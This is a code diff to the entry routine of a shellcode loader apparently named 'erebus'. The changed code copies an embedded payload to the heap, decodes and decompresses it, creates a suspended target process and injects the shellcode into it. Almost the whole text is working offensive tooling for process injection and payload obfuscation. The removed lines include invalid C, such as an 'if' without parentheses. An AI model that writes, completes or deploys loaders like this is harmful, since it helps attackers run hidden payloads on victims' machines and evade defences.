@@ -7,54 +7,29 @@
 // =========================================================================
 VOID entry(void)
 {
-	// 1. Configure Injection Method based on Config
 	erebus::config.injection_method = ExecuteShellcode;
-	erebus::config.decryption_method = DecryptShellcode;
-	erebus::config.decompression_method = DecompressShellcode;
-	erebus::config.decode_method = DecodeShellcode;
 
 	HANDLE process_handle = NULL;
 	HANDLE thread_handle = NULL;
 
-	// Start with the raw shellcode from the header
+	// Allocate memory for shellcode on heap
+	BYTE* pPayload = (BYTE*)malloc(sizeof(shellcode));
+	if (!pPayload) return; // Allocation failed
+
+	// Copy raw shellcode to heap
+	memcpy(pPayload, shellcode, sizeof(shellcode));
 	SIZE_T shellcode_size = sizeof(shellcode);
-	if (shellcode_size == 0) return;
-
-	// ============================================================
-	// 0. PREPARE MEMORY
-	// ============================================================
-	// Copy to Heap for Safe Decryption (Avoids Read-Only Access Violations)
-	// unsigned char* pPayload = (unsigned char*)malloc(shellcode_size);
-	// if (!pPayload) return; // Allocation failed
-
-	// // Copy raw shellcode to heap
-	// memcpy(pPayload, shellcode, shellcode_size);
-
-	// ============================================================
-	// 1. DEOBFUSCATE
-	// ============================================================
-
-	if CONFIG_ENCODING_TYPE != 0 {
-		BYTE* pDecoded = NULL;
-		SIZE_T sDecodedSize = 0;
-		if (erebus::config.decode_method((CHAR*)pPayload, shellcode_size, &pDecoded, &sDecodedSize)) 
-		{
-			erebus::RtlFreeHeapC(RtlProcessHeap(), 0, pPayload);
-			pPayload = pDecoded;
-			shellcode_size = sDecodedSize;
-		} else {
-			erebus::RtlFreeHeapC(RtlProcessHeap(), 0, pPayload);
-			return; // Decoding failed
-		}
+	if (shellcode_size == 0) {
+		free(pPayload);
+		return;
 	}
 
-	if (sizeof(key) > 0 && key[0] != 0x00 && CONFIG_ENCRYPTION_TYPE != 0) {
-		erebus::config.decryption_method(pPayload, shellcode_size, key, sizeof(key));
-	}
-
-	if CONFIG_COMPRESSION_TYPE != 0 {
-		erebus::config.decompression_method(&pPayload, &shellcode_size);
-	}
+	// ============================================================
+	// 1. DEOBFUSCATE (via config-based approach)
+	// ============================================================
+	// These functions use CONFIG_ENCODING_TYPE, CONFIG_ENCRYPTION_TYPE, CONFIG_COMPRESSION_TYPE
+	erebus::AutoDetectAndDecodeString((CHAR*)pPayload, shellcode_size, &pPayload, &shellcode_size);
+	erebus::DecompressShellcode(&pPayload, &shellcode_size);
 
 	// ============================================================
 	// 2. TARGET PROCESS SETUP
@@ -63,7 +38,7 @@ VOID entry(void)
 	// Remote Injection
 	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
 	if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle)) {
-		erebus::RtlFreeHeapC(RtlProcessHeap(), 0, pPayload);
+		free(pPayload);
 		return;
 	}
 #elif CONFIG_INJECTION_MODE == 2
@@ -73,13 +48,13 @@ VOID entry(void)
 #endif
 
 	// ============================================================
-	// 3. INJECT (Loader handles Decompression + Writing)
+	// 3. INJECT
 	// ============================================================
 	erebus::config.injection_method(pPayload, shellcode_size, process_handle, thread_handle);
 
-	// Cleanup
-	memset(pPayload, 0, shellcode_size);
-	erebus::RtlFreeHeapC(pPayload);
+	// Cleanup - securely zero memory before freeing
+	RtlSecureZeroMemory(pPayload, shellcode_size);
+	free(pPayload);
 
 	return;
 }
